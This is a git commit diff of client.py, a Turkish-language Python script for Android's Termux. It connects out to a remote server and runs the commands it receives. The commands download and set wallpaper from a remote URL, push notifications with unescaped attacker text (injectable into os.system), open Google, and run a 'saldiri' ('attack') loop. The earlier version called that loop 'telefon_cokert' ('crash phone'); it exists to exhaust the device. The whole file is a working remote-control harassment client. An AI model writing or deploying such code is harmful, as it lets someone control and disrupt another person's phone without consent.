a4c202c65ed602b076e4c533db9c52aa235c8cd4
RobotAdam899 <anonbot918@gmail.com>
2025-07-14 03:29:44 +0300

    Update client.py
    Signed-off-by: RobotAdam899 <anonbot918@gmail.com>

--- client.py
+++ client.py
@@ -1,20 +1,56 @@
-client.py
+import socket
+import os
+import urllib.request
+import time
 
-import socket import os import urllib.request
+SERVER_IP = input("Modem IP gir: ")
+PORT = int(input("Port gir: "))
 
-SERVER_IP = input("Server IP gir: ") PORT = int(input("Port gir: "))
+s = socket.socket()
+try:
+    s.connect((SERVER_IP, PORT))
+    s.send("[✓] Baglanti basarili.\n".encode())
+except:
+    print("[!] Baglanti hatasi.")
+    exit()
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((SERVER_IP, PORT)) s.send("[✓] Baglanti basarili".encode()) except: print("[!] Baglanti hatasi") exit()
+def arkaplan_degistir(url):
+    try:
+        urllib.request.urlretrieve(url, "arkaplan.jpg")
+        os.system("termux-wallpaper -f arkaplan.jpg")
+        s.send("[✓] Arka plan degistirildi\n".encode())
+    except:
+        s.send("[!] Arka plan degistirilemedi\n".encode())
 
-def arkaplan_degistir(url): try: urllib.request.urlretrieve(url, "arka.jpg") os.system("termux-wallpaper -f arka.jpg") s.send("[✓] Arkaplan degistirildi".encode()) except: s.send("[!] Arkaplan degistirilemedi".encode())
+def uyari_gonder(mesaj):
+    os.system(f'termux-notification --title "UYARI" --content "{mesaj}" --priority high')
+    s.send("[✓] Uyari gonderildi\n".encode())
 
-def google_ac(): os.system("termux-open-url https://www.google.com") s.send("[✓] Google acildi".encode())
+def google_ac():
+    os.system("termux-open-url https://www.google.com")
+    s.send("[✓] Google acildi\n".encode())
 
-def uyari_gonder(mesaj): os.system(f'termux-notification --title "UYARI" --content "{mesaj}"') s.send("[✓] Uyari gonderildi".encode())
+def saldiri():
+    while True:
+        os.system("ls > /dev/null")
 
-def telefon_cokert(): while True: os.system("echo 'Fsociety!' > /dev/null")
-
-while True: try: komut = s.recv(1024).decode().strip() if komut.startswith("arkaplan "): _, url = komut.split(" ", 1) arkaplan_degistir(url) elif komut == "google": google_ac() elif komut.startswith("uyari "): _, mesaj = komut.split(" ", 1) uyari_gonder(mesaj) elif komut == "saldiri": telefon_cokert() elif komut == "exit": break else: s.send("[!] Gecersiz komut".encode()) except: break
-
-s.close()
-
+while True:
+    try:
+        komut = s.recv(1024).decode().strip()
+        if komut.startswith("arkaplan "):
+            _, url = komut.split(" ", 1)
+            arkaplan_degistir(url)
+        elif komut.startswith("uyari "):
+            _, mesaj = komut.split(" ", 1)
+            uyari_gonder(mesaj)
+        elif komut == "google":
+            google_ac()
+        elif komut == "saldiri":
+            saldiri()
+        elif komut == "exit":
+            s.close()
+            break
+        else:
+            s.send("[!] Gecersiz komut\n".encode())
+    except:
+        break
